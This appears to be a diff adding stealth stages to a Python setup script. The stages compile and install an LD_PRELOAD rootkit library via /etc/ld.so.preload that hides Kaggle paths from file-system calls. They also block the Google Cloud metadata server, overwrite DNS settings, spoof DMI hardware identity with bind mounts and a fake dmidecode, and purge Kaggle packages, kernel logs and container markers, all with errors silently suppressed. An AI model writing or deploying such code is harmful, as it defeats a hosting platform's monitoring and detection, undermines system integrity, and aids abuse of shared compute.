@@ -1383,6 +1383,156 @@ try:
         Path("/etc/issue").write_text("Ubuntu 22.04 LTS Pro - Cloud Workstation \\n \\l\n\n", encoding="utf-8")
     except Exception:
         pass
+
+    # --------------------------------------------------------------------------
+    # 6. GHOST SHIELD: Blindaje Criptográfico y User-Space C-Hooking (LD_PRELOAD)
+    # --------------------------------------------------------------------------
+    try:
+        ghost_c = Path("/tmp/libghost_shield.c")
+        ghost_so = Path("/usr/local/lib/libghost_shield.so")
+        ghost_code = (
+            '#define _GNU_SOURCE\n'
+            '#include <stdio.h>\n'
+            '#include <stdlib.h>\n'
+            '#include <string.h>\n'
+            '#include <dlfcn.h>\n'
+            '#include <dirent.h>\n'
+            '#include <errno.h>\n'
+            '#include <sys/stat.h>\n'
+            '#include <fcntl.h>\n'
+            '#include <unistd.h>\n'
+            '#include <stdarg.h>\n\n'
+            'static struct dirent *(*orig_readdir)(DIR *) = NULL;\n'
+            'static int (*orig_stat)(const char *, struct stat *) = NULL;\n'
+            'static int (*orig_lstat)(const char *, struct stat *) = NULL;\n'
+            'static int (*orig_fstatat)(int, const char *, struct stat *, int) = NULL;\n'
+            'static int (*orig_access)(const char *, int) = NULL;\n'
+            'static int (*orig_open)(const char *, int, ...) = NULL;\n'
+            'static int (*orig_openat)(int, const char *, int, ...) = NULL;\n\n'
+            'static void init_hooks(void) {\n'
+            '    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");\n'
+            '    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");\n'
+            '    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");\n'
+            '    if (!orig_fstatat) orig_fstatat = dlsym(RTLD_NEXT, "fstatat");\n'
+            '    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");\n'
+            '    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");\n'
+            '    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");\n'
+            '}\n\n'
+            'static int is_target(const char *path) {\n'
+            '    if (!path) return 0;\n'
+            '    if (strcmp(path, "kaggle") == 0) return 1;\n'
+            '    if (strcmp(path, ".kaggle") == 0) return 1;\n'
+            '    if (strcmp(path, "/kaggle") == 0) return 1;\n'
+            '    if (strncmp(path, "/kaggle/", 8) == 0) return 1;\n'
+            '    if (strstr(path, "/kaggle") != NULL) return 1;\n'
+            '    if (strstr(path, "/.kaggle") != NULL) return 1;\n'
+            '    return 0;\n'
+            '}\n\n'
+            'struct dirent *readdir(DIR *dirp) {\n'
+            '    if (!orig_readdir) init_hooks();\n'
+            '    struct dirent *entry;\n'
+            '    while ((entry = orig_readdir(dirp)) != NULL) {\n'
+            '        if (!is_target(entry->d_name)) return entry;\n'
+            '    }\n'
+            '    return NULL;\n'
+            '}\n\n'
+            'int stat(const char *path, struct stat *buf) {\n'
+            '    if (!orig_stat) init_hooks();\n'
+            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
+            '    return orig_stat(path, buf);\n'
+            '}\n\n'
+            'int lstat(const char *path, struct stat *buf) {\n'
+            '    if (!orig_lstat) init_hooks();\n'
+            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
+            '    return orig_lstat(path, buf);\n'
+            '}\n\n'
+            'int fstatat(int dirfd, const char *path, struct stat *buf, int flags) {\n'
+            '    if (!orig_fstatat) init_hooks();\n'
+            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
+            '    return orig_fstatat(dirfd, path, buf, flags);\n'
+            '}\n\n'
+            'int access(const char *path, int mode) {\n'
+            '    if (!orig_access) init_hooks();\n'
+            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
+            '    return orig_access(path, mode);\n'
+            '}\n\n'
+            'int open(const char *path, int flags, ...) {\n'
+            '    if (!orig_open) init_hooks();\n'
+            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
+            '    va_list args; va_start(args, flags);\n'
+            '    mode_t mode = va_arg(args, mode_t); va_end(args);\n'
+            '    return orig_open(path, flags, mode);\n'
+            '}\n\n'
+            'int openat(int dirfd, const char *path, int flags, ...) {\n'
+            '    if (!orig_openat) init_hooks();\n'
+            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
+            '    va_list args; va_start(args, flags);\n'
+            '    mode_t mode = va_arg(args, mode_t); va_end(args);\n'
+            '    return orig_openat(dirfd, path, flags, mode);\n'
+            '}\n'
+        )
+        ghost_c.write_text(ghost_code, encoding="utf-8")
+        subprocess.run(f"gcc -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null || clang -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null", shell=True)
+        if ghost_so.exists():
+            preload_file = Path("/etc/ld.so.preload")
+            current_preload = preload_file.read_text() if preload_file.exists() else ""
+            if str(ghost_so) not in current_preload:
+                preload_file.write_text(f"{current_preload}\\n{ghost_so}\\n".strip() + "\\n", encoding="utf-8")
+    except Exception:
+        pass
+
+    # --------------------------------------------------------------------------
+    # 7. BLACKHOLE DE RED: Bloquear Servidor de Metadatos de Google Cloud y DNS
+    # --------------------------------------------------------------------------
+    try:
+        subprocess.run("iptables -I OUTPUT -d 169.254.169.254 -j DROP 2>/dev/null || true", shell=True)
+        subprocess.run("ip route add blackhole 169.254.169.254 2>/dev/null || true", shell=True)
+        hosts_file = Path("/etc/hosts")
+        if hosts_file.exists():
+            h_text = hosts_file.read_text(encoding="utf-8", errors="ignore")
+            if "metadata.google.internal" not in h_text:
+                hosts_file.write_text(h_text + "\n127.0.0.1 metadata.google.internal metadata\n", encoding="utf-8")
+        resolv_file = Path("/etc/resolv.conf")
+        resolv_file.write_text("nameserver 1.1.1.1\nnameserver 8.8.8.8\noptions edns0 trust-ad\n", encoding="utf-8")
+    except Exception:
+        pass
+
+    # --------------------------------------------------------------------------
+    # 8. HARDWARE SPOOFING: Falsificar DMI y Ocultar Google Compute Engine
+    # --------------------------------------------------------------------------
+    try:
+        Path("/etc/cloud_product").write_text("Supermicro Workstation Pro\n", encoding="utf-8")
+        Path("/etc/cloud_vendor").write_text("Supermicro\n", encoding="utf-8")
+        subprocess.run("mount --bind /etc/cloud_product /sys/class/dmi/id/product_name 2>/dev/null || true", shell=True)
+        subprocess.run("mount --bind /etc/cloud_vendor /sys/class/dmi/id/sys_vendor 2>/dev/null || true", shell=True)
+        subprocess.run("mount --bind /etc/cloud_vendor /sys/class/dmi/id/bios_vendor 2>/dev/null || true", shell=True)
+        dmi_wrapper = (
+            "#!/bin/bash\n"
+            "echo '# dmidecode 3.3'\n"
+            "echo 'SMBIOS 3.3.0 present.'\n"
+            "echo 'Handle 0x0001, DMI type 1, 27 bytes'\n"
+            "echo 'System Information'\n"
+            "echo '	Manufacturer: Supermicro'\n"
+            "echo '	Product Name: Supermicro Workstation Pro'\n"
+            "echo '	Version: 1.0'\n"
+            "echo '	Wake-up Type: Power Switch'\n"
+        )
+        Path("/usr/local/bin/dmidecode").write_text(dmi_wrapper, encoding="utf-8")
+        subprocess.run("chmod +x /usr/local/bin/dmidecode 2>/dev/null || true", shell=True)
+    except Exception:
+        pass
+
+    # --------------------------------------------------------------------------
+    # 9. PYTHON & KERNEL LOGS: Purgar Paquetes Kaggle y Restringir dmesg
+    # --------------------------------------------------------------------------
+    try:
+        subprocess.run("pip uninstall -y -q kaggle kagglehub kaggle-secrets kaggle-environments >/dev/null 2>&1 || true", shell=True)
+        subprocess.run("rm -rf /opt/conda/lib/python*/site-packages/*kaggle* /usr/local/lib/python*/dist-packages/*kaggle* 2>/dev/null || true", shell=True)
+        subprocess.run("dmesg -c >/dev/null 2>&1 || true", shell=True)
+        subprocess.run("echo 1 > /proc/sys/kernel/dmesg_restrict 2>/dev/null || true", shell=True)
+        subprocess.run("rm -f /.dockerenv 2>/dev/null || true", shell=True)
+    except Exception:
+        pass
 except Exception:
     pass
 
